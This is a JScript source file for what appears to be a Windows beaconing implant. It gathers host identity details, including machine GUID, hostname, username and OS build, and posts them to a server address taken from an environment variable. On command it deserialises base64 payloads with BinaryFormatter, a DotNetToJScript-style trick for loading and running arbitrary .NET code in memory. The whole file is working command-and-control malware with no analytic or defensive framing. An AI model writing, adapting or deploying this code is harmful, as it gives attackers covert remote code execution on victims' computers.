function runAgent() {
    var IS_CSCRIPT = (typeof WScript != 'undefined');
    var wsh = null, identity = null, exiting = false;
    var clrVer = 'v4.0.30319';
    var HEX = '0123456789abcdef';
    function ensureCom() {
        if (!wsh) wsh = new ActiveXObject('WScript.Shell');
    }
    function log(s) { if (IS_CSCRIPT) WScript.Echo(s); if (typeof dbg != 'undefined') dbg(s); }
    function env(name) {
        ensureCom();
        var v = wsh.ExpandEnvironmentStrings('%' + name + '%');
        return (v == '%' + name + '%') ? '' : v;
    }
    function toHex(a) {
        var s = '';
        for (var i = 0; i < a.length; i++) s += HEX.charAt(a[i] >> 4) + HEX.charAt(a[i] & 15);
        return s;
    }
    function unhex(s) {
        s = s.replace(/\s+/g, '');
        var a = [];
        for (var i = 0; i + 1 < s.length; i += 2) a.push(parseInt(s.substring(i, i + 2), 16));
        return a;
    }
    function u32(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
    function randomGuid() {
        function h(n) {
            var s = '';
            for (var i = 0; i < n; i++) s += HEX.charAt(Math.floor(Math.random() * 16));
            return s;
        }
        return h(8) + '-' + h(4) + '-' + h(4) + '-' + h(4) + '-' + h(12);
    }
    function base64ToStream(b, l) {
        var enc = new ActiveXObject('System.Text.ASCIIEncoding');
        var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
        ba = transform.TransformFinalBlock(ba, 0, length);
        var ms = new ActiveXObject('System.IO.MemoryStream');
        ms.Write(ba, 0, l);
        ms.Position = 0;
        return ms;
    }
    function buildIdentity() {
        var guid = '';
        try { guid = wsh.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid').toLowerCase(); } catch (e) {}
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(guid)) guid = randomGuid();
        var archRaw = env('PROCESSOR_ARCHITEW6432');
        if (!archRaw) archRaw = env('PROCESSOR_ARCHITECTURE');
        var arch = ({ AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' })[archRaw] || archRaw || 'unknown';
        var pArch = ({ AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' })[env('PROCESSOR_ARCHITECTURE')] || '';
        var ver = '', build = '', cpu = '';
        try {
            var svc = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\cimv2');
            var os = new Enumerator(svc.ExecQuery('SELECT Version, BuildNumber FROM Win32_OperatingSystem'));
            for (; !os.atEnd(); os.moveNext()) { ver = '' + os.item().Version; build = '' + os.item().BuildNumber; }
            var pr = new Enumerator(svc.ExecQuery('SELECT Architecture FROM Win32_Processor'));
            for (; !pr.atEnd(); pr.moveNext()) { cpu = '' + pr.item().Architecture; }
        } catch (e) {}
        arch = ({ '0': 'i386', '9': 'x86_64', '12': 'aarch64' })[cpu] || arch;
        var vm = /^(\d+)\.(\d+)/.exec(ver);
        if (vm) { if (vm[1] == '6' && vm[2] == '1') clrVer = 'v2.0.50727'; }
        else if (build == '7600' || build == '7601') clrVer = 'v2.0.50727';
        return [
            ['X-Agent-Api-Version', '1'],
            ['X-Agent-Uuid', guid],
            ['X-Agent-Hostname', env('COMPUTERNAME')],
            ['X-Agent-Username', env('USERNAME')],
            ['X-Agent-Arch', arch],
            ['X-Agent-Process-Arch', pArch],
            ['X-Agent-Platform', 'Windows'],
            ['X-Agent-Os-Version', ver],
            ['X-Agent-Build', build],
            ['X-Agent-Commit', ''],
            ['X-Agent-Name-Id', '1'],
            ['X-Agent-Bitness', (pArch == 'x86_64' || pArch == 'aarch64') ? '64' : '32'],
            ['X-Agent-Capabilities', '0800000000000000']
        ];
    }
    function dispatchCmd(bytes) {
        function ulen(x) {
            var p = 0;
            if (x.charAt(x.length - 1) == '=') p++;
            if (x.charAt(x.length - 2) == '=') p++;
            return Math.floor(x.length / 4) * 3 - p;
        }
        if (bytes[0] == 10) { exiting = true; return null; }
        if (bytes[0] == 11) {
            try {
                var t = '';
                for (var i = 1; i < bytes.length; i += 4096) {
                    var s = '';
                    for (var j = i; j < i + 4096 && j < bytes.length; j++) s += String.fromCharCode(bytes[j]);
                    t += s;
                }
                var cut = t.indexOf('\n\n');
                var head = (cut >= 0 ? t.substring(0, cut) : '').split('\n');
                var tail = cut >= 0 ? t.substring(cut + 2) : '';
                var sp = tail.indexOf('\n');
                var s1 = (sp >= 0 ? tail.substring(0, sp) : '').replace(/\s+/g, '');
                var b64 = (sp >= 0 ? tail.substring(sp + 1) : '').replace(/\s+/g, '');
                ensureCom();
                try { wsh.Environment('Process')('COMPLUS_Version') = clrVer; log('upgrade: COMPLUS_Version=' + clrVer); } catch (e0) {}
                var drive = 0, entry = '';
                for (var i2 = 0; i2 < head.length; i2++) {
                    var ln = head[i2].replace(/\r$/, '');
                    if (ln.length == 0) continue;
                    if (ln.indexOf('!d=') == 0) drive = parseInt(ln.substring(3), 10) || 0;
                    else if (ln.indexOf('!e=') == 0) entry = ln.substring(3);
                    else {
                        var eq = ln.indexOf('=');
                        if (eq > 0) { ensureCom(); wsh.Environment('Process')('' + ln.substring(0, eq)) = '' + ln.substring(eq + 1); log('upgrade: set ' + ln); }
                    }
                }
                log('upgrade: blob ' + b64.length + ' chars, stage1 ' + s1.length + ' chars, drive ' + drive);
                if (s1.length > 0) {
                    try { var f1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); f1.Deserialize_2(base64ToStream(s1, ulen(s1))); } catch (e1) { log('upgrade: stage1 threw (expected)'); }
                }
                var f2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
                if (drive == 1) {
                    var al = new ActiveXObject('System.Collections.ArrayList');
                    al.Add(undefined);
                    f2.Deserialize_2(base64ToStream(b64, ulen(b64))).DynamicInvoke(al.ToArray()).CreateInstance(entry);
                } else {
                    f2.Deserialize_2(base64ToStream(b64, ulen(b64)));
                }
                log('upgrade: deserialize done');
                return u32(0);
            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return u32(1); }
        }
        return u32(2);
    }
    ensureCom();
    var url = env('H_URL');
    if (!url) { log('beacon endpoint not set'); return 'fail'; }
    identity = buildIdentity();
    log('JScript agent beaconing to ' + url + ' as ' + identity[1][1]);
    var pending = '';
    while (!exiting) {
        var xhr = null;
        try {
            xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
            xhr.open('POST', url, false);
            try { xhr.setProxy(1, '', ''); } catch (e2) {}
            xhr.setTimeouts(10000, 10000, 15000, 45000);
            for (var i = 0; i < identity.length; i++) {
                try { xhr.setRequestHeader(identity[i][0], identity[i][1]); } catch (e3) {}
            }
            xhr.send(pending);
        } catch (e) {
            log('beacon failed: ' + (e && e.message ? e.message : e));
            return 'fail';
        }
        if (xhr.status != 200) {
            log('http ' + xhr.status);
            return 'fail';
        }
        pending = '';
        var text = (xhr.responseText || '').replace(/\s+/g, '');
        if (text.length == 0) { continue; }
        var resp = dispatchCmd(unhex(text));
        if (exiting) { log('exit'); return 'exit'; }
        pending = toHex(resp);
    }
    return 'exit';
}
